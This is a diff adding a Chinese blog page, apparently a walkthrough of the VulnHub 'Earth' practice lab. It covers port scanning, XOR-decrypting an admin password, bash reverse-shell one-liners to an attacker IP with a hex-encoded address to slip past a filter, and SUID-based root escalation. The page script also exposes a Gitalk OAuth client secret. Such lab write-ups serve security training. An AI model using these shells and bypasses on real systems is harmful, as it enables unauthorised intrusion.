@@ -1,0 +1,285 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>vulnhub-Earth靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="vulnhub-Earth靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="打靶训练第七台，一台思路不错的靶机。
+信息收集
+靶机IP
+
+这里靶机IP为 192.168.56.135
+直接扫描端口
+nmap -A 192.168.56.135
+
+
+得到靶机开放端口为 22 80 443.
+直接访问80端口。
+
+返回4..." />
+    <meta name="keywords" content="vulnhub" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              vulnhub-Earth靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-25
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/gd7wNOhQ5/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>打靶训练第七台，一台思路不错的靶机。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>靶机IP</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025112519132.png" alt="image-20231025112519132" loading="lazy"></figure>
+<p>这里靶机IP为 192.168.56.135</p>
+<p>直接扫描端口</p>
+<pre><code>nmap -A 192.168.56.135
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025112622042.png" alt="image-20231025112622042" loading="lazy"></figure>
+<p>得到靶机开放端口为 22 80 443.</p>
+<p>直接访问80端口。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025112706223.png" alt="image-20231025112706223" loading="lazy"></figure>
+<p>返回400。</p>
+<p>继续查看nmap那里得到了两个DNS地址。</p>
+<p>将地址写入host文件。</p>
+<p>访问这两个域名。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025112815002.png" alt="image-20231025112815002" loading="lazy"></figure>
+<p>得到信息。但不知道有什么用。</p>
+<p>直接目录暴破。</p>
+<p>得到在 http://earth.local/admin/login 存在登录界面。</p>
+<p>https://terratest.earth.local/robots.txt</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025113330787.png" alt="image-20231025113330787" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025113357838.png" alt="image-20231025113357838" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025113440930.png" alt="image-20231025113440930" loading="lazy"></figure>
+<p>这里我们得到了新的信息，加密算法是 XOR，并且有一个testdata.txt文档用于测试加密，用户名是terra，先访问testdata.txt并保存。</p>
+<p>借鉴网上的脚本</p>
+<pre><code>import binascii
+data1 = &quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;
+f = binascii.b2a_hex(open('testdata.txt', 'rb').read()).decode()
+print(hex(int(data1,16) ^ int(f,16)))
+</code></pre>
+<p>将生成的十六进制 转文本。得到密码为earthclimatechangebad4humans</p>
+<blockquote>
+<p>用户名 terra</p>
+<p>密码      earthclimatechangebad4humans</p>
+</blockquote>
+<p>https://earth.local/admin 这里去登录</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>登陆后 有一个命令执行框。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025113801283.png" alt="image-20231025113801283" loading="lazy"></figure>
+<p>直接写反弹shell。</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.56.129/6666 0&gt;&amp;1
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025113827006.png" alt="image-20231025113827006" loading="lazy"></figure>
+<p>提示不可以远程连接。</p>
+<p>看了其他的才知道IP地址需要16进制绕过。</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x38.0x81/6666 0&gt;&amp;1
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025114717260.png" alt="image-20231025114717260" loading="lazy"></figure>
+<p>成功得到 shell。</p>
+<h2 id="权限提升">权限提升</h2>
+<p>查找可以提权的</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025115542283.png" alt="image-20231025115542283" loading="lazy"></figure>
+<p>重设root</p>
+<p>执行下这个 发现无法执行。</p>
+<p>靶机无调试环境 用nc搞到kali上、调试得到是由于有几条目录没有。</p>
+<p>将所需的目录添加上</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025115725342.png" alt="image-20231025115725342" loading="lazy"></figure>
+<p>重新执行</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025115752529.png" alt="image-20231025115752529" loading="lazy"></figure>
+<p>root密码重设为Earth</p>
+<p>直接 su root登录</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231025115826894.png" alt="image-20231025115826894" loading="lazy"></figure>
+<p>登录后可得到flag。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/cve-2017-12615-lou-dong-fu-xian/">
+              <h3 class="post-title">
+                 CVE-2017-12615漏洞复现
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
